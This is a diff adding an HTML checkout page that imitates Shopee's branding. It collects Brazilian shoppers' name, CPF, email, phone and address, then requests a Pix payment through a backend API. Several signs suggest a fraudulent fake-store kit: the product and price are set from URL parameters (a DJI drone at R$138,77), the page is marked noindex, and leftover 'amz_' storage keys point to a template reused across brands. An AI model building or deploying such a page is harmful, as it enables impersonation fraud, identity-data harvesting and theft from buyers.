@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Shopee - Finalizar Compra</title>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --shopee-orange: #EE4D2D;
+            --shopee-orange-light: #FF5722;
+            --shopee-gradient: linear-gradient(181deg, rgb(245, 63, 45), rgb(254, 99, 50) 87%);
+            --text-base: #222;
+            --text-secondary: #757575;
+            --border-color: #efefef;
+            --bg-gray: #f5f5f5;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 14px;
+            line-height: 1.4;
+            color: var(--text-base);
+            background-color: var(--bg-gray);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Header */
+        header {
+            background: var(--shopee-gradient);
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 1px 5px rgba(0,0,0,0.1);
+        }
+
+        .shopee-logo {
+            width: 130px;
+            display: block;
+        }
+
+        .checkout-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin: 0;
+            color: #fff;
+        }
+
+        /* Container */
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        @media (min-width: 992px) {
+            .container {
+                flex-direction: row;
+                padding: 25px;
+                gap: 25px;
+            }
+            .main-content {
+                flex: 1;
+            }
+            .sidebar {
+                width: 380px;
+            }
+        }
+
+        /* Sections */
+        .section-card {
+            background-color: #fff;
+            border-radius: 4px;
+            padding: 20px;
+            margin-bottom: 15px;
+            box-shadow: 0 1px 1px rgba(0,0,0,0.05);
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--shopee-orange);
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 12px;
+        }
+
+        /* Form */
+        .form-row {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+        }
+
+        .form-group {
+            flex: 1;
+            min-width: 200px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group.small { flex: 0 0 100px; }
+
+        label {
+            font-weight: 500;
+            margin-bottom: 6px;
+            font-size: 13px;
+            color: #555;
+        }
+
+        input, select {
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 2px;
+            font-size: 14px;
+            outline: none;
+            width: 100%;
+            font-family: inherit;
+        }
+
+        input:focus {
+            border-color: var(--shopee-orange);
+        }
+
+        /* Shipping Options */
+        .shipping-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .shipping-option {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .shipping-option:hover {
+            background-color: #fcfcfc;
+        }
+
+        .shipping-option.selected {
+            border-color: var(--shopee-orange);
+            background-color: #fffcfb;
+        }
+
+        .shipping-option input[type="radio"] {
+            width: 20px;
+            height: 20px;
+            accent-color: var(--shopee-orange);
+        }
+
+        .shipping-info {
+            flex: 1;
+        }
+
+        .shipping-name {
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .shipping-time {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .shipping-price {
+            font-weight: 700;
+            color: var(--shopee-orange);
+        }
+
+        /* Summary Sidebar */
+        .summary-card {
+            background-color: #fff;
+            border-radius: 4px;
+            padding: 20px;
+            box-shadow: 0 1px 1px rgba(0,0,0,0.05);
+            position: sticky;
+            top: 90px;
+        }
+
+        .product-brief {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px dashed var(--border-color);
+        }
+
+        .product-img {
+            width: 80px;
+            height: 80px;
+            object-fit: cover;
+            border-radius: 4px;
+            border: 1px solid var(--border-color);
+        }
+
+        .product-info h4 {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        .total-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+
+        .total-row.grand-total {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid var(--border-color);
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--shopee-orange);
+        }
+
+        .btn-checkout {
+            background: var(--shopee-gradient);
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 15px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 20px;
+            text-transform: uppercase;
+            box-shadow: 0 2px 4px rgba(238, 77, 45, 0.3);
+        }
+
+        .btn-checkout:active {
+            transform: translateY(1px);
+        }
+
+        /* Pix Result */
+        #pix-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            background: #fff;
+            text-align: center;
+        }
+
+        .pix-qr {
+            width: 220px;
+            height: 220px;
+            margin: 20px 0;
+            padding: 10px;
+            border: 1px solid var(--border-color);
+        }
+
+        .pix-copy-btn {
+            background: #fff;
+            border: 1px solid var(--shopee-orange);
+            color: var(--shopee-orange);
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            width: 100%;
+        }
+
+        /* Loading Overlay */
+        #loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.95);
+            z-index: 2000;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .shopee-loader {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--shopee-orange);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<header>
+    <img src="images/logo_shopee_white.webp" alt="Shopee" class="shopee-logo">
+    <h1 class="checkout-title">Finalizar Compra</h1>
+</header>
+
+<div class="container">
+    <div class="main-content">
+        <!-- 1. Dados Pessoais -->
+        <div class="section-card">
+            <h2 class="section-title">1. Informações Pessoais</h2>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="full-name">Nome Completo</label>
+                    <input type="text" id="full-name" placeholder="Como no seu documento" required>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="cpf">CPF</label>
+                    <input type="tel" id="cpf" placeholder="000.000.000-00" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">E-mail</label>
+                    <input type="email" id="email" placeholder="seu@email.com" required>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="phone">Celular</label>
+                    <input type="tel" id="phone" placeholder="(00) 00000-0000" required>
+                </div>
+            </div>
+        </div>
+
+        <!-- 2. Endereço -->
+        <div class="section-card">
+            <h2 class="section-title">2. Endereço de Entrega</h2>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="cep">CEP</label>
+                    <input type="tel" id="cep" placeholder="00000-000" maxlength="9" required>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="address">Endereço (Rua/Avenida)</label>
+                    <input type="text" id="address" required>
+                </div>
+                <div class="form-group small">
+                    <label for="number">Número</label>
+                    <input type="text" id="number" required>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="complement">Complemento (Opcional)</label>
+                    <input type="text" id="complement" placeholder="Apto, Sala, Referência">
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="neighborhood">Bairro</label>
+                    <input type="text" id="neighborhood" required>
+                </div>
+                <div class="form-group">
+                    <label for="city">Cidade</label>
+                    <input type="text" id="city" required>
+                </div>
+                <div class="form-group small">
+                    <label for="state">UF</label>
+                    <select id="state" required>
+                        <option value="">UF</option>
+                        <option value="AC">AC</option><option value="AL">AL</option><option value="AP">AP</option><option value="AM">AM</option><option value="BA">BA</option><option value="CE">CE</option><option value="DF">DF</option><option value="ES">ES</option><option value="GO">GO</option><option value="MA">MA</option><option value="MT">MT</option><option value="MS">MS</option><option value="MG">MG</option><option value="PA">PA</option><option value="PB">PB</option><option value="PR">PR</option><option value="PE">PE</option><option value="PI">PI</option><option value="RJ">RJ</option><option value="RN">RN</option><option value="RS">RS</option><option value="RO">RO</option><option value="RR">RR</option><option value="SC">SC</option><option value="SP">SP</option><option value="SE">SE</option><option value="TO">TO</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+
+        <!-- 3. Frete -->
+        <div class="section-card">
+            <h2 class="section-title">3. Opções de Envio</h2>
+            <div class="shipping-options">
+                <label class="shipping-option" for="ship-standard">
+                    <input type="radio" id="ship-standard" name="shipping-method" value="standard" checked>
+                    <div class="shipping-info">
+                        <div class="shipping-name">Entrega Padrão</div>
+                        <div class="shipping-time">Receba em 15 a 25 dias úteis</div>
+                    </div>
+                    <div class="shipping-price">Grátis</div>
+                </label>
+                <label class="shipping-option" for="ship-express">
+                    <input type="radio" id="ship-express" name="shipping-method" value="express">
+                    <div class="shipping-info">
+                        <div class="shipping-name">Entrega Expressa</div>
+                        <div class="shipping-time">Receba em 5 a 10 dias úteis</div>
+                    </div>
+                    <div class="shipping-price">R$ 19,90</div>
+                </label>
+            </div>
+        </div>
+
+        <!-- 4. Pagamento -->
+        <div class="section-card">
+            <h2 class="section-title">4. Método de Pagamento</h2>
+            <div style="display: flex; align-items: center; gap: 15px; padding: 15px; border: 1px solid var(--shopee-orange); border-radius: 4px; background: #fffcfb;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo_Pix_Brasil.png" alt="Pix" style="height: 25px;">
+                <div style="flex: 1;">
+                    <div style="font-weight: 600;">Pix</div>
+                    <div style="font-size: 12px; color: var(--text-secondary);">Aprovação instantânea</div>
+                </div>
+                <div style="color: var(--shopee-orange); font-size: 18px;">✓</div>
+            </div>
+            
+            <div id="pix-container">
+                <h3 style="font-size: 16px; margin-bottom: 10px;">Escaneie o QR Code abaixo:</h3>
+                <img src="" alt="QR Code Pix" class="pix-qr" id="pix-qr">
+                <p style="font-size: 13px; color: #555; margin-bottom: 15px;">Ou copie o código para o seu banco:</p>
+                <button class="pix-copy-btn" id="pix-copy-btn" onclick="copyPix()">Copiar Código Pix</button>
+                <div id="pix-code" style="display:none;"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="sidebar">
+        <div class="summary-card">
+            <h3 style="font-size: 16px; margin-bottom: 15px;">Resumo do Pedido</h3>
+            <div class="product-brief">
+                <img id="product-img" src="assets/img/product-drone.jpg" alt="Produto" class="product-img">
+                <div class="product-info">
+                    <h4 id="product-name-label">Carregando produto...</h4>
+                    <div style="font-size: 12px; color: var(--text-secondary);">Qtd: 1</div>
+                </div>
+            </div>
+
+            <div class="total-row">
+                <span>Subtotal:</span>
+                <span id="subtotal">R$ 0,00</span>
+            </div>
+            <div class="total-row">
+                <span>Frete:</span>
+                <span id="shipping-label">Grátis</span>
+            </div>
+            <div class="total-row grand-total">
+                <span>Total:</span>
+                <span id="total-price">R$ 0,00</span>
+            </div>
+
+            <button class="btn-checkout" id="btn-finish" onclick="processOrder()">Finalizar Pedido</button>
+            
+            <div style="margin-top: 20px; font-size: 11px; color: #999; text-align: center;">
+                <p>Pagamento Seguro • Satisfação Garantida</p>
+                <p style="margin-top: 5px;">Ao finalizar, você aceita nossos termos de uso.</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="loading-overlay">
+    <div class="shopee-loader"></div>
+    <p style="font-weight: 600; color: var(--shopee-orange);">Processando seu pedido...</p>
+</div>
+
+<script src="meta-attribution.js"></script>
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const storage = {
+        get(key) { try { return sessionStorage.getItem(key) || ''; } catch (e) { return ''; } },
+        set(key, value) { try { sessionStorage.setItem(key, String(value)); } catch (e) {} }
+    };
+
+    // Initialize labels
+    const rawPrice = urlParams.get('price') || storage.get('amz_total_amount') || '138,77';
+    const productName = urlParams.get('product') || storage.get('amz_product_name') || 'Drone DJI Mini 4 Pro';
+    const productImg = urlParams.get('img') || storage.get('amz_product_image') || 'assets/img/product-drone.jpg';
+
+    document.getElementById('product-name-label').innerText = productName;
+    document.getElementById('product-img').src = productImg;
+
+    function parseAmount(val) {
+        let clean = String(val).replace(/[^\d,.-]/g, '');
+        if (clean.includes(',') && clean.includes('.')) {
+            clean = clean.lastIndexOf(',') > clean.lastIndexOf('.') ? clean.replace(/\./g, '').replace(',', '.') : clean.replace(/,/g, '');
+        } else if (clean.includes(',')) { clean = clean.replace(',', '.'); }
+        return parseFloat(clean) || 0;
+    }
+
+    const baseAmount = parseAmount(rawPrice);
+    
+    function updateTotals() {
+        const shipExpress = document.getElementById('ship-express').checked;
+        const shipPrice = shipExpress ? 19.90 : 0;
+        const total = baseAmount + shipPrice;
+        
+        document.getElementById('subtotal').innerText = baseAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+        document.getElementById('shipping-label').innerText = shipPrice === 0 ? 'Grátis' : shipPrice.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+        document.getElementById('total-price').innerText = total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+        
+        // Update cards visual state
+        document.querySelectorAll('.shipping-option').forEach(opt => {
+            const radio = opt.querySelector('input');
+            if (radio.checked) opt.classList.add('selected');
+            else opt.classList.remove('selected');
+        });
+    }
+
+    document.querySelectorAll('input[name="shipping-method"]').forEach(el => el.addEventListener('change', updateTotals));
+    updateTotals();
+
+    // Logic from checkout.html
+    async function apiFetch(url, options = {}) {
+        const response = await fetch(url, options);
+        if (!response.ok) {
+            const err = await response.json().catch(() => ({}));
+            throw new Error(err.error || 'Erro na requisição');
+        }
+        return response.json();
+    }
+
+    async function processOrder() {
+        const btn = document.getElementById('btn-finish');
+        const overlay = document.getElementById('loading-overlay');
+        
+        // Basic Validation
+        const fields = ['full-name', 'cpf', 'email', 'phone', 'cep', 'address', 'number', 'neighborhood', 'city', 'state'];
+        for (const id of fields) {
+            const el = document.getElementById(id);
+            if (!el.value.trim()) {
+                alert('Por favor, preencha todos os campos obrigatórios.');
+                el.focus();
+                return;
+            }
+        }
+
+        btn.disabled = true;
+        overlay.style.display = 'flex';
+
+        try {
+            const shipMethod = document.querySelector('input[name="shipping-method"]:checked').value;
+            const total = parseAmount(document.getElementById('total-price').innerText);
+            
+            const payload = {
+                customer: {
+                    name: document.getElementById('full-name').value,
+                    document: document.getElementById('cpf').value,
+                    email: document.getElementById('email').value,
+                    phone: document.getElementById('phone').value
+                },
+                address: {
+                    zipCode: document.getElementById('cep').value,
+                    street: document.getElementById('address').value,
+                    number: document.getElementById('number').value,
+                    complement: document.getElementById('complement').value,
+                    neighborhood: document.getElementById('neighborhood').value,
+                    city: document.getElementById('city').value,
+                    state: document.getElementById('state').value
+                },
+                payment: { method: 'pix' },
+                order: {
+                    totalAmount: total,
+                    product: productName,
+                    origin: 'Shopee Checkout'
+                },
+                attributionId: storage.get('amz_attribution_id'),
+                sessionId: storage.get('amz_session_id')
+            };
+
+            const result = await apiFetch('/api/checkout/pix', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            if (result.pix) {
+                document.getElementById('pix-qr').src = result.pix.qrCodeBase64;
+                document.getElementById('pix-code').innerText = result.pix.qrCode;
+                document.getElementById('pix-container').style.display = 'flex';
+                btn.style.display = 'none';
+                document.querySelector('.section-card:nth-of-type(1)').style.display = 'none';
+                document.querySelector('.section-card:nth-of-type(2)').style.display = 'none';
+                document.querySelector('.section-card:nth-of-type(3)').style.display = 'none';
+                window.scrollTo({ top: document.getElementById('pix-container').offsetTop - 100, behavior: 'smooth' });
+            }
+        } catch (e) {
+            alert(e.message);
+        } finally {
+            btn.disabled = false;
+            overlay.style.display = 'none';
+        }
+    }
+
+    function copyPix() {
+        const code = document.getElementById('pix-code').innerText;
+        navigator.clipboard.writeText(code).then(() => {
+            const btn = document.getElementById('pix-copy-btn');
+            const originalText = btn.innerText;
+            btn.innerText = 'Copiado!';
+            btn.style.backgroundColor = '#f6ffed';
+            btn.style.borderColor = '#52c41a';
+            btn.style.color = '#52c41a';
+            setTimeout(() => {
+                btn.innerText = originalText;
+                btn.style = '';
+            }, 2000);
+        });
+    }
+
+    // Mask for inputs
+    function mask(o, f) { setTimeout(() => { o.value = f(o.value); }, 1); }
+    function mCPF(v) { v = v.replace(/\D/g, ""); v = v.replace(/(\d{3})(\d)/, "$1.$2"); v = v.replace(/(\d{3})(\d)/, "$1.$2"); v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2"); return v; }
+    function mTel(v) { v = v.replace(/\D/g, ""); v = v.replace(/^(\d{2})(\d)/g, "($1) $2"); v = v.replace(/(\d)(\d{4})$/, "$1-$2"); return v; }
+    function mCEP(v) { v = v.replace(/\D/g, ""); v = v.replace(/^(\d{5})(\d)/, "$1-$2"); return v; }
+
+    document.getElementById('cpf').onkeypress = function() { mask(this, mCPF); };
+    document.getElementById('phone').onkeypress = function() { mask(this, mTel); };
+    document.getElementById('cep').onkeypress = function() { mask(this, mCEP); };
+
+    // CEP Auto-fill
+    document.getElementById('cep').onblur = async function() {
+        const cep = this.value.replace(/\D/g, "");
+        if (cep.length === 8) {
+            try {
+                const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+                const data = await res.json();
+                if (!data.erro) {
+                    document.getElementById('address').value = data.logradouro;
+                    document.getElementById('neighborhood').value = data.bairro;
+                    document.getElementById('city').value = data.localidade;
+                    document.getElementById('state').value = data.uf;
+                    document.getElementById('number').focus();
+                }
+            } catch (e) {}
+        }
+    };
+</script>
+
+</body>
+</html>
